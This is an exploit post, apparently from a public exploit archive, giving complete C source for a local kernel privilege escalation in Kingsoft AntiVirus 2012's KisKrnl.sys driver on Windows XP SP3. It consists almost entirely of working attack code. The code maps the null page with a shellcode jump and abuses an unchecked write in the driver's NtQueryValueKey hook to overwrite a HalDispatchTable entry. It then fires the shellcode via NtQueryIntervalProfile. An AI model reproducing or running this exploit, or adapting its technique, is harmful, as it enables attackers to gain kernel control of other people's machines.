# Kingsoft AntiVirus 2012 KisKrnl.sys <= 2011.7.8.913 Local Kernel Mode Privilege Escalation Exploit
# Date: 2011-7-23
# Author : MJ0011
# Version: Kingsoft AntiVirus 2012
# Tested on: Windows XP SP3


DETAILS:


In KisKrnl.sys 's hook function of "NtQueryValueKey" , it directly write to the buffer of "ResultLength" without any check


EXPLOIT CODE??


#include "stdafx.h"
#include "windows.h"
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
#define RTL_CONSTANT_STRING(s) { sizeof( s ) - sizeof( (s)[0] ), sizeof( s ), s }
typedef const UNICODE_STRING *PCUNICODE_STRING;
UNICODE_STRING name = RTL_CONSTANT_STRING(L"123");
#include "malloc.h"
PVOID GetInfoTable(ULONG ATableType)
{
ULONG mSize = 0x4000;
PVOID mPtr = NULL;
LONG status;
HMODULE hlib = GetModuleHandle("ntdll.dll");
PVOID pZwQuerySystemInformation = GetProcAddress(hlib , "ZwQuerySystemInformation");
do
{
mPtr = malloc(mSize);
if (mPtr)
{
__asm
{
push 0
push mSize
push mPtr
push ATableType
call pZwQuerySystemInformation
mov status , eax
}
}
else
{
return NULL;
}
if (status == 0xc0000004)
{
free(mPtr);
mSize = mSize * 2;
}
} while (status == 0xc0000004);
if (status == 0)
{
return mPtr;
}
free(mPtr);
return NULL;
}
enum { SystemModuleInformation = 11,
SystemHandleInformation = 16 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;




typedef VOID (WINAPI *PINBV_ACQUIRE_DISPLAY_OWNERSHIP)(VOID);
typedef BOOLEAN (WINAPI *PINBV_RESET_DISPLAY)(VOID);
typedef VOID (WINAPI *PINBV_SOLID_COLOR_FILL)(
 ULONG x1,
 ULONG y1,
 ULONG x2,
 ULONG y2,
 ULONG color
    );
typedef ULONG (WINAPI *PINBV_SET_TEXT_COLOR)(
 ULONG Color
    );
typedef
VOID
(*INBV_DISPLAY_STRING_FILTER)(
 PUCHAR *Str
    );


typedef VOID (WINAPI *PINBV_INSTALL_DISPLAY_STRING_FILTER)(
    INBV_DISPLAY_STRING_FILTER DisplayStringFilter
    );
typedef BOOLEAN (WINAPI *PINBV_ENABLE_DISPLAY_STRING)(
    BOOLEAN bEnable
    );
typedef VOID (WINAPI *PINVB_SET_SCROLL_REGION)(
    ULONG x1,
    ULONG y1,
    ULONG x2,
    ULONG y2
    );
typedef VOID (WINAPI *PINBV_DISPLAY_STRING)(
    PUCHAR Str
    );
PINBV_ACQUIRE_DISPLAY_OWNERSHIP InbvAcquireDisplayOwnership = 0 ; 
PINBV_RESET_DISPLAY InbvResetDisplay = 0 ; 
PINBV_SOLID_COLOR_FILL InbvSolidColorFill = 0 ; 
PINBV_SET_TEXT_COLOR InbvSetTextColor = 0 ; 
PINBV_INSTALL_DISPLAY_STRING_FILTER InbvInstallDisplayStringFilter = 0 ; 
PINBV_ENABLE_DISPLAY_STRING InbvEnableDisplayString = 0 ; 
PINVB_SET_SCROLL_REGION InbvSetScrollRegion = 0 ; 
PINBV_DISPLAY_STRING InbvDisplayString= 0 ; 


#define VGA_COLOR_BLACK 0
#define VGA_COLOR_RED 1
#define VGA_COLOR_GREEN 2
#define VGA_COLOR_GR 3
#define VGA_COLOR_BULE 4
#define VGA_COLOR_DARK_MEGAENTA 5
#define VGA_COLOR_TURQUOISE 6
#define VGA_COLOR_GRAY 7
#define VGA_COLOR_BRIGHT_GRAY 8
#define VGA_COLOR_BRIGHT_RED 9
#define VGA_COLOR_BRIGHT_GREEN 10
#define VGA_COLOR_BRIGHT_YELLOW 11
#define VGA_COLOR_BRIGHT_BULE 12
#define VGA_COLOR_BRIGHT_PURPLE 13
#define VGA_COLOR_BRIGHT_TURQUOISE 14
#define VGA_COLOR_WHITE 15
UCHAR DisplayString[] = 
"                                                                                "
"                                                                                "
"                                                                                "
"                ---- ===== EXPLOIT SUCCESSFULLY ==== ----                       "
"                                                                                "
"                                                                                "
" Kingsoft AntiVirus 2012 Sandbox Local Privilege Escalation Exploit             "
"                                                                                "
" VULNERABLE PRODUCT                                                             "
"                                                                                "
" Kingsoft AntiVirus 2012                                                        "
"                                                                                "
"                                                                                "
" VULERABLE FILE                                                                 "
" KisKnl.sys <= 2011.7.8.913                                                     "
"                                                                                "
" AUTHOR                                                                         "
"                                                                                "
" MJ0011                                                                         "
" th_decoder@126.com                                                             "
"                                                                                "
" 2011-2-21                                                                      "
"                                                                                "
"                                                                                "
"                                                                                ";


VOID InbvShellCode()
{
//DISABLE INTERRUPT


__asm
{
cli
}


//RESET TO VGA MODE


InbvAcquireDisplayOwnership();


InbvResetDisplay();


//FILL FULL SCREEN


InbvSolidColorFill(0 , 0 , 639 , 479 ,VGA_COLOR_BLACK);


//SET TEXT COLOR
InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);


InbvInstallDisplayStringFilter(NULL);


InbvEnableDisplayString(TRUE);


InbvSetScrollRegion( 0 , 0 , 639 ,477);


InbvDisplayString(DisplayString);
while(TRUE)
{


};




}


BOOL InbvInit(PVOID ntosbase , PSTR ntosname)
{
HMODULE hlib = LoadLibrary(ntosname);


if (hlib == NULL)
{
return FALSE ; 
}


InbvAcquireDisplayOwnership = (PINBV_ACQUIRE_DISPLAY_OWNERSHIP)((ULONG)GetProcAddress(hlib , "InbvAcquireDisplayOwnership") - (ULONG)hlib + (ULONG)ntosbase);
InbvResetDisplay = (PINBV_RESET_DISPLAY)((ULONG)GetProcAddress(hlib , "InbvResetDisplay") - (ULONG)hlib + (ULONG)ntosbase);
InbvSolidColorFill = (PINBV_SOLID_COLOR_FILL)((ULONG)GetProcAddress(hlib , "InbvSolidColorFill") - (ULONG)hlib + (ULONG)ntosbase);
InbvSetTextColor = (PINBV_SET_TEXT_COLOR)((ULONG)GetProcAddress(hlib , "InbvSetTextColor") - (ULONG)hlib + (ULONG)ntosbase);
InbvInstallDisplayStringFilter = (PINBV_INSTALL_DISPLAY_STRING_FILTER)((ULONG)GetProcAddress(hlib , "InbvInstallDisplayStringFilter") - (ULONG)hlib + (ULONG)ntosbase);
InbvEnableDisplayString = (PINBV_ENABLE_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvEnableDisplayString") - (ULONG)hlib + (ULONG)ntosbase);
InbvSetScrollRegion = (PINVB_SET_SCROLL_REGION)((ULONG)GetProcAddress(hlib , "InbvSetScrollRegion") - (ULONG)hlib + (ULONG)ntosbase);
InbvDisplayString = (PINBV_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvDisplayString") - (ULONG)hlib + (ULONG)ntosbase);


if (InbvAcquireDisplayOwnership &&
InbvResetDisplay &&
InbvSolidColorFill &&
InbvSetTextColor &&
InbvInstallDisplayStringFilter &&
InbvEnableDisplayString &&
InbvSetScrollRegion &&
InbvDisplayString)
{
return TRUE ; 
}
return FALSE ; 


}


typedef LONG (WINAPI *PNT_ALLOCATE_VIRTUAL_MEMORY)(
  HANDLE ProcessHandle,
  PVOID *BaseAddress,
  ULONG_PTR ZeroBits,
  PSIZE_T RegionSize,
  ULONG AllocationType,
  ULONG Protect
  );


int main(int argc, char* argv[])
{


printf("Kingsoft AntiVirus 2012 SandBox Local Privilege Escalation Exploit\n"
"KisKnl.sys <= 2011.7.8.913\n"
"\nBy MJ0011\nth_decoder@126.com\nPRESS ENTER\n");


getchar();


//for init invb shell code




PSYSTEM_MODULE_INFORMATION pinfo = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);
if (pinfo==0)
{
printf("cannot get system info\n");
return 0 ; 
}
if (!InbvInit(pinfo->Module[0].Base , strrchr(pinfo->Module[0].ImageName , '\\') + 1))
{
printf("cannot init inbv system!\n");
return 0 ; 
}


//get ntqueryvaluekey 


PVOID p = GetProcAddress(GetModuleHandle("ntdll.dll") , "NtQueryValueKey");


//alloc shellcode jump


PNT_ALLOCATE_VIRTUAL_MEMORY NTAllocateVM = (PNT_ALLOCATE_VIRTUAL_MEMORY)GetProcAddress(GetModuleHandle("ntdll.dll") , "NtAllocateVirtualMemory");


PVOID BaseAddress = (PVOID)0x1 ; 
ULONG dwsize = 0x1000 ; 
LONG status ; 
status = NTAllocateVM
(
GetCurrentProcess() , 
&BaseAddress , 
0 , 
&dwsize , 
MEM_COMMIT | MEM_RESERVE ,
PAGE_READWRITE
);


if (status !=0)
{
printf("err alloc vm %08x\n", status);
getchar();
return 0 ; 
}
//result length always <=0x800
//0~0x800: NOP
//0x800: shell code


memset((PVOID)0x0 , 0x90 , 0x1000);
*(BYTE*)((ULONG)0x800) = 0xe9 ; 
*(ULONG*)((ULONG)0x801) = (ULONG)InbvShellCode - (ULONG)0x800 - 0x5 ; 


//get haldispatchtable


HMODULE hntos = LoadLibrary(strrchr(pinfo->Module[0].ImageName , '\\')+1);
if (hntos == 0 )
{
printf("cannot load ntos\n");
getchar();
return 0 ; 
}
PVOID pHalDispatchTable = GetProcAddress(hntos , "HalDispatchTable");
pHalDispatchTable = (PVOID)((ULONG)pHalDispatchTable - (ULONG)hntos);
pHalDispatchTable = (PVOID)((ULONG)pHalDispatchTable + (ULONG)pinfo->Module[0].Base);
PVOID xHalQuerySystemInformationAddr = (PVOID)((ULONG)pHalDispatchTable+ sizeof(ULONG));
FreeLibrary(hntos);


//create sandboxed key / value


HKEY hkey ; 
ULONG err = RegOpenKeyEx(HKEY_CURRENT_USER , "Software" , 0 , KEY_READ , &hkey);


if (err!=ERROR_SUCCESS)
{
printf("open key read failed %u\n" ,err);
getchar();
return 0 ; 
}
HKEY hkey2 ; 


err = RegOpenKeyEx(HKEY_CURRENT_USER , "Software" , 0 , KEY_WRITE , &hkey2);


if (err != ERROR_SUCCESS)
{
printf("open key write failed %u\n", err);
getchar();
return 0 ; 
}
DWORD dd ; 


err = RegSetValueEx(hkey2 , "123" , 0 , REG_DWORD , (CONST BYTE*)&dd , sizeof(DWORD));


if (err != ERROR_SUCCESS)
{
printf("set value %u\n" , err);
getchar();


return 0 ;
}




//overwrite xhal


BYTE buffer[100];
PVOID pbuf = buffer ; 


__asm
{
push xHalQuerySystemInformationAddr
push 100
push pbuf
push 2
lea eax,name
push eax
push hkey
call p
}


//fire our shell code


PVOID pqi = GetProcAddress(GetModuleHandle("ntdll.dll" ) , "NtQueryIntervalProfile");
__asm
{
push 0 
push 2
call pqi 
}






return 0;
}

